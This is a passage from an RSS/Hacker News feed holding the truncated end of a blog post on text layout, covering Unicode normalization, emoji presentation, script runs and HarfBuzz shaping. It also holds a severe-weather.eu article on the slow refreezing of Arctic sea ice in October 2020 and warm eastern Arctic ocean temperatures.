<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

<p><em>Another</em> whole class of complexity is emoji. A lot of emoji can be rendered with either <a href="https://en.wikipedia.org/wiki/Emoji#Emoji_versus_text_presentation">text or emoji presentation</a>, and there are no hard and fast rules to pick one or the other. Generally the text presentation is in a symbol font, and the emoji presentation is in a separate color font. A particularly tough example is the smiling emoji, which began its encoding life as 0x01 in <a href="https://en.wikipedia.org/wiki/Code_page_437">Code page 437</a>, the standard 8-bit character encoding of the original IBM PC, and is now U+263A in Unicode. However, the suggested default presentation is text, which won’t do in a world which expects color. Apple on iOS unilaterally chose an emoji presentation, so many text stacks follow Apple’s lead. (Incidentally, the most robust way to encode such emoji is to append a <a href="https://en.wikipedia.org/wiki/Variation_Selectors_(Unicode_block)">variation selector</a> to pin down the presentation.)</p>

<p>Another source of complexity when trying to write a cross-platform text layout engine is querying the system fonts. See <a href="https://raphlinus.github.io/rust/skribo/text/2019/04/04/font-fallback.html">Font fallback deep dive</a> for more information about that.</p>

<p>I should note one thing, which might help people doing archaeology of legacy text stacks: it used to be pretty common for text layout to resolve “compatibility” forms such as NFKC and NFKD, and this can lead to various problems. But today it is more common to solve that particular problem by providing a font stack with <em>massive</em> Unicode coverage, including all the code points in the relevant compatibility ranges.</p>

<h3 id="script">Script</h3>

<p>The <em>shaping</em> of text, or the transformation of a sequence of code points into a sequence of positioned glyphs, depends on the script. Some scripts, such as Arabic and Devanagari, have extremely elaborate shaping rules, while others, such as Chinese, are a fairly straightforward mapping from code point into glyph. Latin is somewhere in the middle, starting with a straightforward mapping, but ligatures and kerning are also required for high quality text layout.</p>

<p>Determining script runs is reasonably straightforward - many characters have a Unicode script property which uniquely identifies which script they belong to. However, some characters, such as space, are “common,” so the assigned script just continues the previous run.</p>

<p>A simple example is “hello мир”. This string is broken into two script runs: “hello “ is <code>Latn</code>, and “мир” is <code>Cyrl</code>.</p>

<h3 id="shaping-cluster">Shaping (cluster)</h3>

<p>At this point, we have a run of constant style, font, direction, and script. It is ready for <em>shaping.</em> Shaping is a complicated process that converts a string (sequence of Unicode code points) into positioned glyphs. For the purpose of this blog post, we can generally treat it as a black box. Fortunately, a very high quality open source implementation exists, in the form of HarfBuzz.</p>

<p>We’re not <em>quite</em> done with segmentation, though, as shaping assigns substrings in the input to <a href="https://harfbuzz.github.io/clusters.html">clusters</a> of glyphs. The correspondence depends a lot on the font. In Latin, the string “fi” is often shaped to a single glyph (a ligature). For complex scripts such as Devanagari, a cluster is most often a syllable in the source text, and complex reordering can happen within the cluster.</p>

<p>Clusters are important for <em>hit testing,</em> or determining the correspondence between a physical cursor position in the text layout and the offset within the text. Generally, they can be ignored if the text will only be rendered, not edited (or selected).</p>

<p>Note that these shaping clusters are distinct from grapheme clusters. The “fi” example has two grapheme clusters but a single shaping cluster, so a grapheme cluster boundary can cut a shaping cluster. Since …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/text/2020/10/26/text-layout.html">https://raphlinus.github.io/text/2020/10/26/text-layout.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/text/2020/10/26/text-layout.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24901029</guid>
            <pubDate>Mon, 26 Oct 2020 20:32:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Arctic Sea Ice not freezing In October – first time since measurements began]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 66 (<a href="https://news.ycombinator.com/item?id=24900778">thread link</a>) | @clumsysmurf
<br/>
October 26, 2020 | https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/ | <a href="https://web.archive.org/web/*/https://www.severe-weather.eu/news/arctic-ocean-sea-ice-2020-jet-stream-effect-winter-fa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><strong>Arctic sea ice melt season usually lasts from March till September. After reaching the minimum extent in September, sea ice starts to grow back in October. But this year, the growth is much slower than last year, with almost no growth in some places. How did this unusual situation happen and can it mean something for the weather towards Winter 2020/2021?</strong><br>
&nbsp;</p>
<h5><span><strong>THE ARCTIC ICE GROWTH</strong></span></h5>
<p>The Arctic sea ice seasonal cycle can be seen in the image below from the Arctic-ROOS system. It shows the Arctic sea ice extent change over a year. The melt season usually starts in March, after the peak ice extent is reached, lasting all the way to September. The graph shows the last few years of data, where we can see the 2020 Arctic ice extent was second-lowest, only behind 2012, which still holds the record for the lowest ice extent since measurements began.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png" data-image-id="20130" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png-nggid0520130-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-analysis-norway.png-nggid0520130-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>But comparing 2012 and 2020, we can see that this year we are also setting a new record, as the Arctic sea ice is not recovering as expected. The sea ice is refreezing back, but at a much slower rate than normal, meaning that some areas are severely falling behind.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png" data-image-id="20131" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png-nggid0520131-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graphs.png-nggid0520131-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>That is even more evident when we look at the comparison of all the years since the active satellite observations began in 1979. This year we observed the second-lowest Arctic sea ice extent on record. But because of the unusually low ice growth in October, the current ice extent is now the lowest for any October in the past 41 years.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg" data-image-id="20158" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg-nggid0520158-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpeg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-graph-zoom.jpeg-nggid0520158-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpeg">
</a>
</p>
<p>Comparing the minimum extent dates for the past 17 years also shows the 2020 minimum to be second lowest, trailing only the grand minimum of 2012. Graphic provided by <a href="https://sites.uci.edu/zlabe/graduate-research/">Zachary Labe</a>.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png" data-image-id="20142" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png-nggid0520142-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-minimum-extent.png-nggid0520142-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Comparing the years by the current date, we are well the lowest for this time of year. That is also evident by the second image, which shows the sea ice anomaly, compared to the long-term average. It shows the 2020 (red area) ice extent anomaly to continue to increase, while in the previous years (white lines), the anomaly already started to decrease by this point.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png" data-image-id="20129" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png-nggid0520129-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-current-extent-comparison.png-nggid0520129-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png" data-image-id="20155" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png-nggid0520155-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-extent-anomaly.png-nggid0520155-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>The analysis image by the National Snow and Ice Data Center (NSIDC) below, shows the current ice concentration and the average/normal long term extent in orange lines. Those orange lines show how far the sea ice should be reaching at this point in time, revealing a huge ice deficit.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png" data-image-id="20170" data-title="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png-nggid0520170-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" title="arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe" width="588" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20588%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-anomaly-winter-2020-2021-jet-stream-united-states-europe.png-nggid0520170-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Growth has obviously begun since mid-September, but the rate was rather weak and is not increasing with time, evident by the recent daily increase rate on the image below. At this point, the daily growth should slowly increase over time, but we can see the daily growth area is not increasing and has rather been almost decreasing over time. The second image shows the October growth compared to previous years, where 2020 is severely trailing behind</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png" data-image-id="20135" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png-nggid0520135-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth.png-nggid0520135-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png" data-image-id="20159" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png-nggid0520159-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-growth-by-years.png-nggid0520159-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Images below show the current sea ice extent and thickness. We can see that the thickness shows a larger area than the concentration. That is because the concentration shows only the sea ice above 15% concentration. Anything below that means the ice is just too fractured and not compact enough.</p>
<p>So the sea ice thickness image reveals that there is thinner uncompacted ice around the edges, which falls below the 15% concentration threshold. This is usually normal because new sea ice is just starting to form on the edges and takes time to get more compact. But this year the ice is not compacting so fast, and we are now going to look at what is behind this unusual event.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png" data-image-id="20126" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png-nggid0520126-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-concentration-analysis.png-nggid0520126-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png" data-image-id="20150" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png-nggid0520150-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-thickness-analysis.png-nggid0520150-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<h5><span><strong>THE VAST ARCTIC OCEAN</strong></span></h5>
<p>The Arctic region is in fact entirely an ocean and has no large-scale landmass. It is the smallest and shallowest of the world’s five major oceans, and also the coldest. It is also the only ocean smaller than the largest country in the world by area, Russia.</p>
<p>The image below shows the Arctic ocean, as it would look without water, revealing a very complex underwater terrain. To understand the current unusual sea ice anomalies, we need to understand the ocean where all the ice floats on. More specifically, we need to understand the state of the ocean in its eastern region, in the Kara Sea, Siberian Sea, and the Laptev Sea. The image below shows these regions in the Arctic Ocean, found on the side opposite to Greenland. The graphic is from one of the more recent Arctic Ocean <a href="https://www.researchgate.net/publication/314163132_New_constraints_on_Arctic_Ocean_Mn_stratigraphy_from_radiocarbon_dating_on_planktonic_foraminifera">studies</a>.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg" data-image-id="20161" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg-nggid0520161-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry" width="626" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20626%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-bathymetry.jpg-nggid0520161-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.jpg">
</a>
</p>
<p>The image below is probably the most important one so far, as it shows the ocean surface temperature anomaly. It shows the ocean temperatures are currently well above normal around the entire Arctic ice sheet. Anomalies of over 2-3 degrees Celsius can be found across all the 3 critical ocean regions we mentioned above.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png" data-image-id="20145" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png-nggid0520145-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-anomaly.png-nggid0520145-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Compared to this time last year, the Atlantic side is actually colder this year, while the eastern Arctic Ocean is obviously much warmer than it was this time last year.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png" data-image-id="20147" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" data-description="" target="_self">
<img src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png-nggid0520147-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png" alt="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change" width="700" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20700%200'%3E%3C/svg%3E" data-lazy-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/cache/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-one-year-ocean-temperature-change.png-nggid0520147-ngg0dyn-700x700x100-00f0w010c010r110f110r010t010.png">
</a>
</p>
<p>Also looking at the raw temperatures, we can see the eastern Arctic ocean is actually in positive surface temperatures, which means a low to zero chance of freezing over at this point. In normal conditions, almost the entire Arctic ocean should be at or below the freezing point – 0°C (black color) by the end of October.</p>
<p><a href="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" title="" data-src="https://www.severe-weather.eu/wp-content/gallery/andrej-news/arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" data-thumbnail="https://www.severe-weather.eu/wp-content/gallery/andrej-news/thumbs/thumbs_arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis.png" data-image-id="20144" data-title="arctic-sea-ice-winter-2020-2021-jet-stream-united-states-europe-ocean-temperature-analysis" data-description="" target="_self">
